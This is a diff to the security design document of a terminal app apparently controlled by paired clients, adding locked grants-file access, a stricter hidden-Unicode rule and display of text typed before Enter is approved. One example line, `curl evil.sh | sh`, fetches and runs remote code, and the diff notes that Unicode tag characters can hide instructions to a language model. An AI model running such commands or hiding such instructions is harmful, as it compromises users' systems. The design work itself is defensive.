@@ -82,8 +82,9 @@ characters of `[A-Za-z0-9_-]`. Inside a pane, `HALYARD_SOCKET` holds the full pa
 - Rate limit, per connection: a token bucket of 64 requests refilled at 32 per second.
   Over the limit, a request gets `-32006`; after 64 such rejections the connection is
   closed.
-- A connection must complete `halyard.hello` within 10 seconds. After that it may stay
-  idle (event subscribers do).
+- A connection must complete `halyard.hello` within 10 seconds of being accepted. This is
+  a total deadline: sending bytes or other lines meanwhile does not extend it. After a
+  successful hello the connection may stay idle (event subscribers do).
 - At most 64 concurrent connections; further ones are closed immediately.
 - At most 3 `halyard.pair` attempts per connection, and only one approval dialog is
   shown at a time across all connections.
@@ -182,10 +183,15 @@ Grants live in a JSON file (the app chooses the path; the default is
 - On load the file must be a regular file owned by us with no group or other bits;
   otherwise the server refuses it, because a writable grants file would let someone add
   a controller.
+- **Every read and every change of the file is a locked read-modify-write:** an exclusive
+  `flock` on `grants.json.lock`, a fresh read of the file, the change, the write, then
+  unlock. Nothing is cached in memory. So two Halyard instances (or the app and a settings
+  tool) sharing the file always agree: a grant revoked in one is rejected by the other on
+  its next request, and recording `last_used` can never write a revoked grant back.
 - **Revocation** removes the grant (the app's settings page, `GrantsHandle::revoke`, or
-  the client itself with `halyard.unpair`). The grant is re-read on every request, so a
-  connected client loses access on its next call, and an event stream stops at its next
-  event.
+  the client itself with `halyard.unpair`). The grant is re-read from disk on every
+  request, so a connected client loses access on its next call, and an event stream stops
+  at its next event.
 
 ### Typing into a pane
 
@@ -201,8 +207,13 @@ the strictest rules:
    - a C0 control character (U+0000 to U+001F, which includes newline, carriage return,
      tab, escape, Ctrl-C, Ctrl-J, and Ctrl-O, which runs the current line in bash),
    - DEL or a C1 control character (U+007F to U+009F),
-   - an invisible or reordering character (zero-width characters, bidi embeddings,
-     overrides and isolates, soft hyphen, byte order mark).
+   - a hidden character: any `Default_Ignorable_Code_Point` (Unicode's
+     `DerivedCoreProperties.txt`) or any character of general category `Cf` (format),
+     `Zl` or `Zp` (line and paragraph separators). That includes zero-width characters,
+     bidi embeddings, overrides and isolates, Unicode tag characters (U+E0000 to U+E007F,
+     which can spell out invisible instructions to a language model), variation
+     selectors, Hangul fillers, the combining grapheme joiner, soft hyphen and byte order
+     mark. The dialog shows each one escaped, as `\u{e0041}`.
 
    Such text needs a fresh approval every time, whatever the grant says.
 
@@ -213,6 +224,15 @@ execution of AI-generated or tool-generated commands, so execution always passes
 the user. Invisible characters are included because they can make the dialog show text
 that differs from what is typed. The server enforces this; the app's dialog cannot
 weaken it.
+
+**Approving Enter shows what Enter will run.** Text typed under "always allow" sits on
+the command line until something sends a newline, and that newline needs approval. So for
+each pane the server remembers the text typed under standing permission since the last
+request the user approved (the most recent 4 KiB), and every dialog for that pane receives
+it as `typed_since_approval`. Approving `\r` after `curl evil.sh | sh` shows
+`curl evil.sh | sh` next to the `\r`. An approval clears the record; a denial keeps it.
+While a dialog is open, standing sends wait, so nothing can slip in unseen. What the user
+types by hand in the pane is not tracked.
 
 Even with "always allow", plain text can still do things in programs that act on single
 keystrokes (a TUI that accepts `y` or a menu number without Enter, an editor in normal
@@ -410,7 +430,7 @@ messages are untrusted text from programs in panes.
   pairing with explicit, named scopes, revocable at any time with immediate effect.
 - **Silent command execution through the API:** typing needs a dialog per request unless
   the user opted in for that client, and text that could execute (newline, carriage
-  return, any control character) or hide its content (invisible characters) needs a
+  return, any control character) or hide its content (hidden Unicode characters) needs a
   dialog every time regardless.
 - **A copied grants file:** it holds only SHA-256 hashes of 256-bit tokens.
 - **Resource abuse by a buggy client:** size limit, rate limit, connection cap, handshake
